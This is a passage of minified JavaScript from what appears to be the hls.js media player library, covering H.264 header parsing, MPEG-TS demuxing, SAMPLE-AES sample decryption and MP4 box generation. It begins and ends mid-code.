1===this.readBits(1)},t.readUByte=function e(){return this.readBits(8)},t.readUShort=function e(){return this.readBits(16)},t.readUInt=function e(){return this.readBits(32)},t.skipScalingList=function e(t){var i,r=8,n=8;for(i=0;i<t;i++)0!==n&&(n=(r+this.readEG()+256)%256),r=0===n?r:n},t.readSPS=function e(){var a,s,o,l,u,c,d,t=0,r=0,n=0,i=0,f=this.readUByte.bind(this),h=this.readBits.bind(this),p=this.readUEG.bind(this),v=this.readBoolean.bind(this),g=this.skipBits.bind(this),A=this.skipEG.bind(this),m=this.skipUEG.bind(this),y=this.skipScalingList.bind(this);if(f(),a=f(),h(5),g(3),f(),m(),100===a||110===a||122===a||244===a||44===a||83===a||86===a||118===a||128===a){var E=p();if(3===E&&g(1),m(),m(),g(1),v())for(c=3!==E?8:12,d=0;d<c;d++)v()&&y(d<6?16:64)}m();var b=p();if(0===b)p();else if(1===b)for(g(1),A(),A(),s=p(),d=0;d<s;d++)A();m(),g(1),o=p(),l=p(),0===(u=h(1))&&g(1),g(1),v()&&(t=p(),r=p(),n=p(),i=p());var k=[1,1];if(v()&&v())switch(f()){case 1:k=[1,1];break;case 2:k=[12,11];break;case 3:k=[10,11];break;case 4:k=[16,11];break;case 5:k=[40,33];break;case 6:k=[24,11];break;case 7:k=[20,11];break;case 8:k=[32,11];break;case 9:k=[80,33];break;case 10:k=[18,11];break;case 11:k=[15,11];break;case 12:k=[64,33];break;case 13:k=[160,99];break;case 14:k=[4,3];break;case 15:k=[3,2];break;case 16:k=[2,1];break;case 255:k=[f()<<8|f(),f()<<8|f()]}return{width:Math.ceil(16*(o+1)-2*t-2*r),height:(2-u)*(l+1)*16-(u?2:4)*(n+i),pixelRatio:k}},t.readSliceType=function e(){return this.readUByte(),this.readUEG(),this.readUEG()},e}(),x=w,O=function(){function e(e,t,r,n){this.decryptdata=r,this.discardEPB=n,this.decrypter=new g.default(e,t,{removePKCS7Padding:!1})}var t=e.prototype;return t.decryptBuffer=function e(t,r){this.decrypter.decrypt(t,this.decryptdata.key.buffer,this.decryptdata.iv.buffer,r)},t.decryptAacSample=function e(t,r,n,i){var a=t[r].unit,s=a.subarray(16,a.length-a.length%16),o=s.buffer.slice(s.byteOffset,s.byteOffset+s.length),l=this;this.decryptBuffer(o,(function(e){e=new Uint8Array(e),a.set(e,16),i||l.decryptAacSamples(t,r+1,n)}))},t.decryptAacSamples=function e(t,r,n){for(;;r++){if(r>=t.length)return void n();if(!(t[r].unit.length<32)){var i=this.decrypter.isSync();if(this.decryptAacSample(t,r,n,i),!i)return}}},t.getAvcEncryptedData=function e(t){for(var r=16*Math.floor((t.length-48)/160)+16,n=new Int8Array(r),i=0,a=32;a<=t.length-16;a+=160,i+=16)n.set(t.subarray(a,a+16),i);return n},t.getAvcDecryptedUnit=function e(t,r){r=new Uint8Array(r);for(var n=0,i=32;i<=t.length-16;i+=160,n+=16)t.set(r.subarray(n,n+16),i);return t},t.decryptAvcSample=function e(t,r,n,i,a,s){var o=this.discardEPB(a.data),l=this.getAvcEncryptedData(o),u=this;this.decryptBuffer(l.buffer,(function(e){a.data=u.getAvcDecryptedUnit(o,e),s||u.decryptAvcSamples(t,r,n+1,i)}))},t.decryptAvcSamples=function e(t,r,n,i){for(;;r++,n=0){if(r>=t.length)return void i();for(var a=t[r].units;!(n>=a.length);n++){var s=a[n];if(!(s.data.length<=48||1!==s.type&&5!==s.type)){var o=this.decrypter.isSync();if(this.decryptAvcSample(t,r,n,i,s,o),!o)return}}}},e}(),L=O,I={video:1,audio:2,id3:3,text:4},D=function(){function P(e,t,r,n){this.observer=e,this.config=r,this.typeSupported=n,this.remuxer=t,this.sampleAes=null,this.pmtUnknownTypes={}}var e=P.prototype;return e.setDecryptData=function e(t){null!=t&&null!=t.key&&"SAMPLE-AES"===t.method?this.sampleAes=new L(this.observer,this.config,t,this.discardEPB):this.sampleAes=null},P.probe=function e(t){var r=P._syncOffset(t);return!(r<0)&&(r&&ue.logger.warn("MPEG2-TS detected but first sync word found @ offset "+r+", junk ahead ?"),!0)},P._syncOffset=function e(t){for(var r=Math.min(1e3,t.length-564),n=0;n<r;){if(71===t[n]&&71===t[n+188]&&71===t[n+376])return n;n++}return-1},P.createTrack=function e(t,r){return{container:"video"===t||"audio"===t?"video/mp2t":void 0,type:t,id:I[t],pid:-1,inputTimeScale:9e4,sequenceNumber:0,samples:[],dropped:"video"===t?0:void 0,isAAC:"audio"===t||void 0,duration:"audio"===t?r:void 0}},e.resetInitSegment=function e(t,r,n,i){this.pmtParsed=!1,this._pmtId=-1,this.pmtUnknownTypes={},this._avcTrack=P.createTrack("video",i),this._audioTrack=P.createTrack("audio",i),this._id3Track=P.createTrack("id3",i),this._txtTrack=P.createTrack("text",i),this.aacOverFlow=null,this.aacLastPTS=null,this.avcSample=null,this.audioCodec=r,this.videoCodec=n,this._duration=i},e.resetTimeStamp=function e(){},e.append=function e(t,r,n,i){var a,o,l,c,d,s=t.length,f=!1;this.pmtUnknownTypes={},this.contiguous=n;var h=this.pmtParsed,p=this._avcTrack,v=this._audioTrack,g=this._id3Track,A=p.pid,m=v.pid,y=g.pid,E=this._pmtId,b=p.pesData,k=v.pesData,_=g.pesData,T=this._parsePAT,S=this._parsePMT.bind(this),C=this._parsePES,R=this._parseAVCPES.bind(this),w=this._parseAACPES.bind(this),O=this._parseMPEGPES.bind(this),L=this._parseID3PES.bind(this),I=P._syncOffset(t);for(s-=(s+I)%188,a=I;a<s;a+=188)if(71===t[a]){if(o=!!(64&t[a+1]),l=((31&t[a+1])<<8)+t[a+2],(48&t[a+3])>>4>1){if((c=a+5+t[a+4])===a+188)continue}else c=a+4;switch(l){case A:o&&(b&&(d=C(b))&&R(d,!1),b={data:[],size:0}),b&&(b.data.push(t.subarray(c,a+188)),b.size+=a+188-c);break;case m:o&&(k&&(d=C(k))&&(v.isAAC?w(d):O(d)),k={data:[],size:0}),k&&(k.data.push(t.subarray(c,a+188)),k.size+=a+188-c);break;case y:o&&(_&&(d=C(_))&&L(d),_={data:[],size:0}),_&&(_.data.push(t.subarray(c,a+188)),_.size+=a+188-c);break;case 0:o&&(c+=t[c]+1),E=this._pmtId=T(t,c);break;case E:o&&(c+=t[c]+1);var D=S(t,c,!0===this.typeSupported.mpeg||!0===this.typeSupported.mp3,null!=this.sampleAes);(A=D.avc)>0&&(p.pid=A),(m=D.audio)>0&&(v.pid=m,v.isAAC=D.isAAC),(y=D.id3)>0&&(g.pid=y),f&&!h&&(ue.logger.log("reparse from beginning"),f=!1,a=I-188),h=this.pmtParsed=!0;break;case 17:case 8191:break;default:f=!0}}else this.observer.trigger(oe.default.ERROR,{type:le.ErrorTypes.MEDIA_ERROR,details:le.ErrorDetails.FRAG_PARSING_ERROR,fatal:!1,reason:"TS packet did not start with 0x47"});b&&(d=C(b))?(R(d,!0),p.pesData=null):p.pesData=b,k&&(d=C(k))?(v.isAAC?w(d):O(d),v.pesData=null):(k&&k.size&&ue.logger.log("last AAC PES packet truncated,might overlap between fragments"),v.pesData=k),_&&(d=C(_))?(L(d),g.pesData=null):g.pesData=_,null==this.sampleAes?this.remuxer.remux(v,p,g,this._txtTrack,r,n,i):this.decryptAndRemux(v,p,g,this._txtTrack,r,n,i)},e.decryptAndRemux=function e(t,r,n,i,a,s,o){if(t.samples&&t.isAAC){var l=this;this.sampleAes.decryptAacSamples(t.samples,0,(function(){l.decryptAndRemuxAvc(t,r,n,i,a,s,o)}))}else this.decryptAndRemuxAvc(t,r,n,i,a,s,o)},e.decryptAndRemuxAvc=function e(t,r,n,i,a,s,o){if(r.samples){var l=this;this.sampleAes.decryptAvcSamples(r.samples,0,0,(function(){l.remuxer.remux(t,r,n,i,a,s,o)}))}else this.remuxer.remux(t,r,n,i,a,s,o)},e.destroy=function e(){this._initPTS=this._initDTS=void 0,this._duration=0},e._parsePAT=function e(t,r){return(31&t[r+10])<<8|t[r+11]},e._trackUnknownPmt=function e(t,r,n){var i=this.pmtUnknownTypes[t]||0;return 0===i&&(this.pmtUnknownTypes[t]=0,r.call(ue.logger,n)),this.pmtUnknownTypes[t]++,i},e._parsePMT=function e(t,r,n,i){var s,l,u={audio:-1,avc:-1,id3:-1,isAAC:!0};for(s=r+3+((15&t[r+1])<<8|t[r+2])-4,r+=12+((15&t[r+10])<<8|t[r+11]);r<s;){switch(l=(31&t[r+1])<<8|t[r+2],t[r]){case 207:if(!i){this._trackUnknownPmt(t[r],ue.logger.warn,"ADTS AAC with AES-128-CBC frame encryption found in unencrypted stream");break}case 15:-1===u.audio&&(u.audio=l);break;case 21:-1===u.id3&&(u.id3=l);break;case 219:if(!i){this._trackUnknownPmt(t[r],ue.logger.warn,"H.264 with AES-128-CBC slice encryption found in unencrypted stream");break}case 27:-1===u.avc&&(u.avc=l);break;case 3:case 4:n?-1===u.audio&&(u.audio=l,u.isAAC=!1):this._trackUnknownPmt(t[r],ue.logger.warn,"MPEG audio found, not supported in this browser");break;case 36:this._trackUnknownPmt(t[r],ue.logger.warn,"Unsupported HEVC stream type found");break;default:this._trackUnknownPmt(t[r],ue.logger.log,"Unknown stream type:"+t[r])}r+=5+((15&t[r+3])<<8|t[r+4])}return u},e._parsePES=function e(t){var n,i,s,o,l,u,c,d,r=0,f=t.data;if(!t||0===t.size)return null;for(;f[0].length<19&&f.length>1;){var h=new Uint8Array(f[0].length+f[1].length);h.set(f[0]),h.set(f[1],f[0].length),f[0]=h,f.splice(1,1)}if(1===((n=f[0])[0]<<16)+(n[1]<<8)+n[2]){if((s=(n[4]<<8)+n[5])&&s>t.size-6)return null;if(192&(i=n[7])&&(u=536870912*(14&n[9])+4194304*(255&n[10])+16384*(254&n[11])+128*(255&n[12])+(254&n[13])/2,64&i?u-(c=536870912*(14&n[14])+4194304*(255&n[15])+16384*(254&n[16])+128*(255&n[17])+(254&n[18])/2)>54e5&&(ue.logger.warn(Math.round((u-c)/9e4)+"s delta between PTS and DTS, align them"),u=c):c=u),d=(o=n[8])+9,t.size<=d)return null;t.size-=d,l=new Uint8Array(t.size);for(var p=0,v=f.length;p<v;p++){var g=(n=f[p]).byteLength;if(d){if(d>g){d-=g;continue}n=n.subarray(d),g-=d,d=0}l.set(n,r),r+=g}return s&&(s-=o+3),{data:l,pts:u,dts:c,len:s}}return null},e.pushAccesUnit=function e(t,r){if(t.units.length&&t.frame){var n=r.samples,i=n.length;if(isNaN(t.pts)){if(!i)return void r.dropped++;var a=n[i-1];t.pts=a.pts,t.dts=a.dts}!this.config.forceKeyFrameOnDiscontinuity||!0===t.key||r.sps&&(i||this.contiguous)?(t.id=i,n.push(t)):r.dropped++}t.debug.length&&ue.logger.log(t.pts+"/"+t.dts+":"+t.debug)},e._parseAVCPES=function e(_,t){var C,w,L,T=this,S=this._avcTrack,r=this._parseAVCNALu(_.data),R=this.avcSample,O=!1,I=this.pushAccesUnit.bind(this),D=function e(t,r,n,i){return{key:t,pts:r,dts:n,units:[],debug:i}};_.data=null,R&&r.length&&!S.audFound&&(I(R,S),R=this.avcSample=D(!1,_.pts,_.dts,"")),r.forEach((function(e){switch(e.type){case 1:w=!0,R||(R=T.avcSample=D(!0,_.pts,_.dts,"")),R.frame=!0;var t=e.data;if(O&&t.length>4){var r=new x(t).readSliceType();2!==r&&4!==r&&7!==r&&9!==r||(R.key=!0)}break;case 5:w=!0,R||(R=T.avcSample=D(!0,_.pts,_.dts,"")),R.key=!0,R.frame=!0;break;case 6:w=!0,(C=new x(T.discardEPB(e.data))).readUByte();for(var n=0,i=0,a=!1,s=0;!a&&C.bytesAvailable>1;){n=0;do{n+=s=C.readUByte()}while(255===s);i=0;do{i+=s=C.readUByte()}while(255===s);if(4===n&&0!==C.bytesAvailable){if(a=!0,181===C.readUByte())if(49===C.readUShort())if(1195456820===C.readUInt())if(3===C.readUByte()){var d=C.readUByte(),h=31&d,p=[d,C.readUByte()];for(L=0;L<h;L++)p.push(C.readUByte()),p.push(C.readUByte()),p.push(C.readUByte());T._insertSampleInOrder(T._txtTrack.samples,{type:3,pts:_.pts,bytes:p})}}else if(5===n&&0!==C.bytesAvailable){if(a=!0,i>16){var v=[];for(L=0;L<16;L++)v.push(C.readUByte().toString(16)),3!==L&&5!==L&&7!==L&&9!==L||v.push("-");var g=i-16,A=new Uint8Array(g);for(L=0;L<g;L++)A[L]=C.readUByte();T._insertSampleInOrder(T._txtTrack.samples,{pts:_.pts,payloadType:n,uuid:v.join(""),userDataBytes:A,userData:Object(N.utf8ArrayToStr)(A.buffer)})}}else if(i<C.bytesAvailable)for(L=0;L<i;L++)C.readUByte()}break;case 7:if(w=!0,O=!0,!S.sps){var m=(C=new x(e.data)).readSPS();S.width=m.width,S.height=m.height,S.pixelRatio=m.pixelRatio,S.sps=[e.data],S.duration=T._duration;var y=e.data.subarray(1,4),E="avc1.";for(L=0;L<3;L++){var b=y[L].toString(16);b.length<2&&(b="0"+b),E+=b}S.codec=E}break;case 8:w=!0,S.pps||(S.pps=[e.data]);break;case 9:w=!1,S.audFound=!0,R&&I(R,S),R=T.avcSample=D(!1,_.pts,_.dts,"");break;case 12:w=!1;break;default:w=!1,R&&(R.debug+="unknown NAL "+e.type+" ")}R&&w&&R.units.push(e)})),t&&R&&(I(R,S),this.avcSample=null)},e._insertSampleInOrder=function e(t,r){var n=t.length;if(n>0){if(r.pts>=t[n-1].pts)t.push(r);else for(var i=n-1;i>=0;i--)if(r.pts<t[i].pts){t.splice(i,0,r);break}}else t.push(r)},e._getLastNalUnit=function e(){var r,t=this.avcSample;if(!t||0===t.units.length){var i=this._avcTrack.samples;t=i[i.length-1]}if(t){var a=t.units;r=a[a.length-1]}return r},e._parseAVCNALu=function e(t){var i,a,c,h,r=0,n=t.byteLength,s=this._avcTrack,o=s.naluState||0,l=o,u=[],f=-1;for(-1===o&&(f=0,h=31&t[0],o=0,r=1);r<n;)if(i=t[r++],o)if(1!==o)if(i)if(1===i){if(f>=0)c={data:t.subarray(f,r-o-1),type:h},u.push(c);else{var p=this._getLastNalUnit();if(p&&(l&&r<=4-l&&p.state&&(p.data=p.data.subarray(0,p.data.byteLength-l)),(a=r-o-1)>0)){var v=new Uint8Array(p.data.byteLength+a);v.set(p.data,0),v.set(t.subarray(0,a),p.data.byteLength),p.data=v}}r<n?(f=r,h=31&t[r],o=0):o=-1}else o=0;else o=3;else o=i?0:2;else o=i?0:1;if(f>=0&&o>=0&&(c={data:t.subarray(f,n),type:h,state:o},u.push(c)),0===u.length){var g=this._getLastNalUnit();if(g){var A=new Uint8Array(g.data.byteLength+t.byteLength);A.set(g.data,0),A.set(t,g.data.byteLength),g.data=A}}return s.naluState=o,u},e.discardEPB=function e(t){for(var a,s,r=t.byteLength,n=[],i=1;i<r-2;)0===t[i]&&0===t[i+1]&&3===t[i+2]?(n.push(i+2),i+=2):i++;if(0===n.length)return t;a=r-n.length,s=new Uint8Array(a);var o=0;for(i=0;i<a;o++,i++)o===n[0]&&(o++,n.shift()),s[i]=t[o];return s},e._parseAACPES=function e(t){var l,u,c,d,f,p,v,r=this._audioTrack,n=t.data,i=t.pts,s=this.aacOverFlow,o=this.aacLastPTS;if(s){var h=new Uint8Array(s.byteLength+n.byteLength);h.set(s,0),h.set(n,s.byteLength),n=h}for(c=0,f=n.length;c<f-1&&!m(n,c);c++);if(c&&(c<f-1?(p="AAC PES did not start with ADTS header,offset:"+c,v=!1):(p="no ADTS header found in AAC PES",v=!0),ue.logger.warn("parsing error:"+p),this.observer.trigger(oe.default.ERROR,{type:le.ErrorTypes.MEDIA_ERROR,details:le.ErrorDetails.FRAG_PARSING_ERROR,fatal:v,reason:p}),v))return;if(y(r,this.observer,n,c,this.audioCodec),u=0,l=E(r.samplerate),s&&o){var g=o+l;Math.abs(g-i)>1&&(ue.logger.log("AAC: align PTS for overlapping frames by "+Math.round((g-i)/90)),i=g)}for(;c<f;){if(m(n,c)){if(c+5<f){var A=b(r,n,c,i,u);if(A){c+=A.length,d=A.sample.pts,u++;continue}}break}c++}s=c<f?n.subarray(c,f):null,this.aacOverFlow=s,this.aacLastPTS=d},e._parseMPEGPES=function e(t){for(var r=t.data,n=r.length,i=0,a=0,s=t.pts;a<n;)if(k.isHeader(r,a)){var o=k.appendFrame(this._audioTrack,r,a,s,i);if(!o)break;a+=o.length,i++}else a++},e._parseID3PES=function e(t){this._id3Track.samples.push(t)},P}(),P=D,M=function(){function e(e,t,r){this.observer=e,this.config=r,this.remuxer=t}var t=e.prototype;return t.resetInitSegment=function e(t,r,n,i){this._audioTrack={container:"audio/mpeg",type:"audio",id:-1,sequenceNumber:0,isAAC:!1,samples:[],len:0,manifestCodec:r,duration:i,inputTimeScale:9e4}},t.resetTimeStamp=function e(){},e.probe=function e(t){var r,n,i=N.default.getID3Data(t,0);if(i&&void 0!==N.default.getTimeStamp(i))for(r=i.length,n=Math.min(t.length-1,r+100);r<n;r++)if(k.probe(t,r))return ue.logger.log("MPEG Audio sync word found !"),!0;return!1},t.append=function e(t,r,n,i){for(var a=N.default.getID3Data(t,0)||[],s=N.default.getTimeStamp(a),o=void 0!==s?90*s:9e4*r,l=a.length,u=t.length,c=0,d=0,f=this._audioTrack,h=[{pts:o,dts:o,data:a}];l<u;)if(k.isHeader(t,l)){var p=k.appendFrame(f,t,l,o,c);if(!p)break;l+=p.length,d=p.sample.pts,c++}else N.default.isHeader(t,l)?(a=N.default.getID3Data(t,l),h.push({pts:d,dts:d,data:a}),l+=a.length):l++;this.remuxer.remux(f,{samples:[]},{samples:h,inputTimeScale:9e4},{samples:[]},r,n,i)},t.destroy=function e(){},e}(),F=M,B=function(){function e(){}return e.getSilentFrame=function e(t,r){if("mp4a.40.2"===t){if(1===r)return new Uint8Array([0,200,0,128,35,128]);if(2===r)return new Uint8Array([33,0,73,144,2,25,0,35,128]);if(3===r)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,142]);if(4===r)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,128,44,128,8,2,56]);if(5===r)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,56]);if(6===r)return new Uint8Array([0,200,0,128,32,132,1,38,64,8,100,0,130,48,4,153,0,33,144,2,0,178,0,32,8,224])}else{if(1===r)return new Uint8Array([1,64,34,128,163,78,230,128,186,8,0,0,0,28,6,241,193,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(2===r)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94]);if(3===r)return new Uint8Array([1,64,34,128,163,94,230,128,186,8,0,0,0,0,149,0,6,241,161,10,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,90,94])}return null},e}(),$=B,l=Math.pow(2,32)-1,U=function(){function h(){}return h.init=function e(){var t;for(t in h.types={avc1:[],avcC:[],btrt:[],dinf:[],dref:[],esds:[],ftyp:[],hdlr:[],mdat:[],mdhd:[],mdia:[],mfhd:[],minf:[],moof:[],moov:[],mp4a:[],".mp3":[],mvex:[],mvhd:[],pasp:[],sdtp:[],stbl:[],stco:[],stsc:[],stsd:[],stsz:[],stts:[],tfdt:[],tfhd:[],traf:[],trak:[],trun:[],trex:[],tkhd:[],vmhd:[],smhd:[]},h.types)h.types.hasOwnProperty(t)&&(h.types[t]=[t.charCodeAt(0),t.charCodeAt(1),t.charCodeAt(2),t.charCodeAt(3)]);var r=new Uint8Array([0,0,0,0,0,0,0,0,118,105,100,101,0,0,0,0,0,0,0,0,0,0,0,0,86,105,100,101,111,72,97,110,100,108,101,114,0]),n=new Uint8Array([0,0,0,0,0,0,0,0,115,111,117,110,0,0,0,0,0,0,0,0,0,0,0,0,83,111,117,110,100,72,97,110,100,108,101,114,0]);h.HDLR_TYPES={video:r,audio:n};var i=new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,12,117,114,108,32,0,0,0,1]),a=new Uint8Array([0,0,0,0,0,0,0,0]);h.STTS=h.STSC=h.STCO=a,h.STSZ=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0]),h.VMHD=new Uint8Array([0,0,0,1,0,0,0,0,0,0,0,0]),h.SMHD=new Uint8Array([0,0,0,0,0,0,0,0]),h.STSD=new Uint8Array([0,0,0,0,0,0,0,1]);var s=new Uint8Array([105,115,111,109]),o=new Uint8Array([97,118,99,49]),l=new Uint8Array([0,0,0,1]);h.FTYP=h.box(h.types.ftyp,s,l,s,o),h.DINF=h.box(h.types.dinf,h.box(h.types.dref,i))},h.box=function e(t){for(var s,r=Array.prototype.slice.call(arguments,1),n=8,i=r.length,a=i;i--;)n+=r[i].byteLength;for((s=new Uint8Array(n))[0]=n>>24&255,s[1]=n>>16&255,s[2]=n>>8&255,s[3]=255&n,s.set(t,4),i=0,n=8;i<a;i++)s.set(r[i],n),n+=r[i].byteLength;return s},h.hdlr=function e(t){return h.box(h.types.hdlr,h.HDLR_TYPES[t])},h.mdat=function e(t){return h.box(h.types.mdat,t)},h.mdhd=function e(t,r){r*=t;var n=Math.floor(r/(l+1)),i=Math.floor(r%(l+1));return h.box(h.types.mdhd,new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,t>>24&255,t>>16&255,t>>8&255,255&t,n>>24,n>>16&255,n>>8&255,255&n,i>>24,i>>16&255,i>>8&255,255&i,85,196,0,0]))},h.mdia=function e(t){return h.box(h.types.mdia,h.mdhd(t.timescale,t.duration),h.hdlr(t.type),h.minf(t))},h.mfhd=function e(t){return h.box(h.types.mfhd,new Uint8Array([0,0,0,0,t>>24,t>>16&255,t>>8&255,255&t]))},h.minf=function e(t){return"audio"===t.type?h.box(h.types.minf,h.box(h.types.smhd,h.SMHD),h.DINF,h.stbl(t)):h.box(h.types.minf,h.box(h.types.vmhd,h.VMHD),h.DINF,h.stbl(t))},h.moof=function e(t,r,n){return h.box(h.types.moof,h.mfhd(t),h.traf(n,r))},h.moov=function e(t){for(var r=t.length,n=[];r--;)n[r]=h.trak(t[r]);return h.box.apply(null,[h.types.moov,h.mvhd(t[0].timescale,t[0].duration)].concat(n).concat(h.mvex(t)))},h.mvex=function e(t){for(var r=t.length,n=[];r--;)n[r]=h.trex(t[r]);return h.box.apply(null,[h.types.mvex].concat(n))},h.mvhd=function e(t,r){r*=t;var n=Math.floor(r/(l+1)),i=Math.floor(r%(l+1)),a=new Uint8Array([1,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,t>>24&255,t>>16&255,t>>8&255,255&t,n>>24,n>>16&255,n>>8&255,255&n,i>>24,i>>16&255,i>>8&255,255&i,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,255,255,255,255]);return h.box(h.types.mvhd,a)},h.sdtp=function e(t){var i,a,r=t.samples||[],n=new Uint8Array(4+r.length);for(a=0;a<r.length;a++)i=r[a].flags,n[a+4]=i.dependsOn<<4|i.isDependedOn<<2|i.hasRedundancy;return h.box(h.types.sdtp,n)},h.stbl=function e(t){return h.box(h.types.stbl,h.stsd(t),h.box(h.types.stts,h.STTS),h.box(h.types.stsc,h.STSC),h.box(h.types.stsz,h.STSZ),h.box(h.types.stco,h.STCO))},h.avc1=function e(t){var i,a,s,r=[],n=[];for(i=0;i<t.sps.length;i++)s=(a=t.sps[i]).byteLength,r.push(s>>>8&255),r.push(255&s),r=r.concat(Array.prototype.slice.call(a));for(i=0;i<t.pps.length;i++)s=(a=t.pps[i]).byteLength,n.push(s>>>8&255),n.push(255&s),n=n.concat(Array.prototype.slice.call(a));var o=h.box(h.types.avcC,new Uint8Array([1,r[3],r[4],r[5],255,224|t.sps.length].concat(r).concat([t.pps.length]).concat(n))),l=t.width,u=t.height,c=t.pixelRatio[0],d=t.pixelRatio[1];return h.box(h.types.avc1,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,l>>8&255,255&l,u>>8&255,255&u,0,72,0,0,0,72,0,0,0,0,0,0,0,1,18,100,97,105,108,121,109,111,116,105,111,110,47,104,108,115,46,106,115,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,17,17]),o,h.box(h.types.btrt,new Uint8Array([0,28,156,128,0,45,198,192,0,45,198,192])),h.box(h.types.pasp,new Uint8Array([c>>24,c>>16&255,c>>8&255,255&c,d>>24,d>>16&255,d>>8&255,255&d])))},h.esds=function e(t){var r=t.config.length;return new Uint8Array([0,0,0,0,3,23+r,0,1,0,4,15+r,64,21,0,0,0,0,0,0,0,0,0,0,0,5].concat([r]).concat(t.config).concat([6,1,2]))},h.mp4a=function e(t){var r=t.samplerate;return h.box(h.types.mp4a,new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,t.channelCount,0,16,0,0,0,0,r>>8&255,255&r,0,0]),h.box(h.types.esds,h.esds(t)))},h.mp3=function e(t){var r=t.samplerate;return h.box(h.types[".mp3"],new Uint8Array([0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,t.channelCount,0,16,0,0,0,0,r>>8&255,255&r,0,0]))},h.stsd=function e(t){return"audio"===t.type?t.isAAC||"mp3"!==t.codec?h.box(h.types.stsd,h.STSD,h.mp4a(t)):h.box(h.types.stsd,h.STSD,h.mp3(t)):h.box(h.types.stsd,h.STSD,h.avc1(t))},h.tkhd=function e(t){var r=t.id,n=t.duration*t.timescale,i=t.width,a=t.height,s=Math.floor(n/(l+1)),o=Math.floor(n%(l+1));return h.box(h.types.tkhd,new Uint8Array([1,0,0,7,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,3,r>>24&255,r>>16&255,r>>8&255,255&r,0,0,0,0,s>>24,s>>16&255,s>>8&255,255&s,o>>24,o>>16&255,o>>8&255,255&o,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,i>>8&255,255&i,0,0,a>>8&255,255&a,0,0]))},h.traf=function e(t,r){var n=h.sdtp(t),i=t.id,a=Math.floor(r/(l+1)),s=Math.floor(r%(l+1));return h.box(h.types.traf,h.box(h.types.tfhd,new Uint8Array([0,0,0,0,i>>24,i>>16&255,i>>8&255,255&i])),h.box(h.types.tfdt,new Uint8Array([1,0,0,0,a>>24,a>>16&255,a>>8&255,255&a,s>>24,s>>16&255,s>>8&255,255&s])),h.trun(t,n.length+16+20+8+16+8+8),n)},h.trak=function e(t){return t.duration=t.duration||4294967295,h.box(h.types.trak,h.tkhd(t),h.mdia(t))},h.trex=function e(t){var r=t.id;return h.box(h.types.trex,new Uint8Array([0,0,0,0,r>>24,r>>16&255,r>>8&255,255&r,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1]))},h.trun=function e(t,r){var o,l,u,c,d,f,n=t.samples||[],i=n.length,a=12+16*i,s=new Uint8Array(a);for(r+=8+a,s.set([0,0,15,1,i>>>24&255,i>>>16&255,i>>>8&255,255&i,r>>>24&255,r>>>16&255,r>>>8&255,255&r],0),o=0;o<i;o++)u=(l=n[o]).duration,c=l.size,d=l.flags,f=l.cts,s.set([u>>>24&255,u>>>16&255,u>>>8&255,255&u,c>>>24&255,c>>>16&255,c>>>8&255,255&c,d.isLeading<<2|d.dependsOn,d.isDependedOn<<6|d.hasRedundancy<<4|d.paddingValue<<1|d.isNonSync,61440&d.degradPrio,15&d.degradPrio,f>>>24&255,f>>>16&255,f>>>8&255,255&f],12+16*o);return h.box(h.types.trun,s)},h.initSegment=function e(t){h.types||h.init();var n,r=h.moov(t);return(n=new Uint8Array(h.FTYP.byteLength+r.byteLength)).set(h.FTYP),n.set(r,h.FTYP.byteLength),n},h}(),ce=U;function f(e,t,r,n){void 0===r&&(r=1),void 0===n&&(n=!1);var i=e*t*r;return n?Math.round(i):i}function de(e,t){return void 0===t&&(t=!1),f(e,1e3,1/9e4,t)}function h(e,t){return void 0===t&&(t=1),f(e,9e4,1/t)}var W=h(10),pe=h(.2),fe=null,j=function(){function e(e,t,r,n){if(this.observer=e,this.config=t,this.typeSupported=r,this.ISGenerated=!1,null===fe){var i=navigator.userAgent.match(/Chrome\/(\d+)/i);fe=i?parseInt(i[1]):0}}var t=e.prototype;return t.destroy=function e(){},t.resetTimeStamp=function e(t){this._initPTS=this._initDTS=t},t.resetInitSegment=function e(){this.ISGenerated=!1},t.getVideoStartPts=function e(t){var n=!1,r=t.reduce((function(e,t){var r=t.pts-e;return r<-4294967296?(n=!0,he(e,t.pts)):r>0?e:t.pts}),t[0].pts);return n&&ue.logger.debug("PTS rollover detected"),r},t.remux=function e(t,r,n,i,a,s,o){if(this.ISGenerated||this.generateIS(t,r,a),this.ISGenerated){var l=t.samples.length,u=r.samples.length,c=a,d=a;if(l&&u){var f=this.getVideoStartPts(r.samples),p=(he(t.samples[0].pts,f)-f)/r.inputTimeScale;c+=Math.max(0,p),d+=Math.max(0,-p)}if(l){t.timescale||(ue.logger.warn("regenerate InitSegment as audio detected"),this.generateIS(t,r,a));var g,v=this.remuxAudio(t,c,s,o);if(u)v&&(g=v.endPTS-v.startPTS),r.timescale||(ue.logger.warn("regenerate InitSegment as video 